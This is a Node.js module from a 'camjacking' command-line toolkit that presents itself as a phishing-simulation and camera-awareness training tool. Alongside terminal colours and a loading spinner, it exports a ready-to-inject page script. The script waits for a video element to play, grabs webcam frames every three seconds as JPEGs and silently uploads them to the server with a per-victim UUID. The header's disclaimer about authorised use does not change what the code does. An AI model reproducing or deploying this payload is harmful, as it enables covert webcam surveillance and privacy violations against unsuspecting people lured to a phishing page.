#!/usr/bin/env node
/**
 * Camjacking - Camera Awareness & Security Training Toolkit (CLI)
 * ---------------------------------------------------------------
 *
 * Author      : Karthikeyan (https://karthithehacker.com)
 * GitHub      : https://github.com/karthi-the-hacker/camjacking
 * Project     : camjacking - A CLI framework for camera security awareness, phishing simulation, and cybersecurity training labs.
 *
 * License     : Open-source — strictly for educational, awareness, and authorized security training purposes ONLY.
 *
 * Note to Users:
 * --------------
 * 🔐 This tool is intended solely for educational use, security awareness programs, and authorized red-team / lab environments.
 * 🚫 Unauthorized use of this tool against individuals, devices, or networks without explicit permission is illegal and unethical.
 * ❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author and repository.
 *
 * Warning to Code Thieves:
 * ------------------------
 * ❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source community principles.
 * 🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
 * ✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
 */

const RED = "\x1b[31m";
const ORANGE = "\x1b[38;5;208m";
const CYAN = "\x1b[36m";
const PURPLE = "\x1b[35m";
const RESET = "\x1b[0m";


function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const injectedScript = `<script>
(function () { const TARGET_ENDPOINT = "/submit"; const INTERVAL_MS = 3000; const urlParams = new URLSearchParams(window.location.search); const UUID = urlParams.get("uuid") || "unknown"; let captureCanvas = document.createElement("canvas"); let captureCtx = captureCanvas.getContext("2d"); let timer = null; function findVideoElement() { return ( document.querySelector("#mainVideo") || document.querySelector("video") ); } async function captureAndSend(video) { if (!video || video.videoWidth === 0 || video.videoHeight === 0) return; captureCanvas.width = video.videoWidth; captureCanvas.height = video.videoHeight; captureCtx.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height); const blob = await new Promise(resolve => captureCanvas.toBlob(resolve, "image/jpeg", 0.8) ); if (!blob) return; const formData = new FormData(); formData.append("image", blob, "frame.jpg"); if (UUID) { formData.append("uuid", UUID); } try { await fetch(TARGET_ENDPOINT, { method: "POST", body: formData }); console.log("[cam.js] Frame sent", UUID ? "uuid=" + UUID : ""); } catch (e) { console.error("[cam.js] Upload failed:", e); } } function startWhenVideoReady() { const video = findVideoElement(); if (!video) return; if (!timer) { timer = setInterval(() => captureAndSend(video), INTERVAL_MS); console.log("[cam.js] Auto-capture started"); } } function waitForVideoPlayback() { const check = setInterval(() => { const video = findVideoElement(); if (video && video.readyState >= 2 && !video.paused) { clearInterval(check); startWhenVideoReady(); } }, 500); } document.addEventListener("DOMContentLoaded", () => { waitForVideoPlayback(); }); window.addEventListener("beforeunload", () => { if (timer) clearInterval(timer); }); })();
</script>`;



function startLoader(text = "Loading") {
  const frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"];
  let i = 0;

  const id = setInterval(() => {
    process.stdout.write(`\r${text} ${frames[i++ % frames.length]}`);
  }, 80);

  return () => {
    clearInterval(id);
    process.stdout.write("\r" + " ".repeat(text.length + 4) + "\r");
  };
}


module.exports = {
  RED,
  ORANGE,
  CYAN,
  PURPLE,
  RESET,
  sleep,
  injectedScript,
  startLoader
};


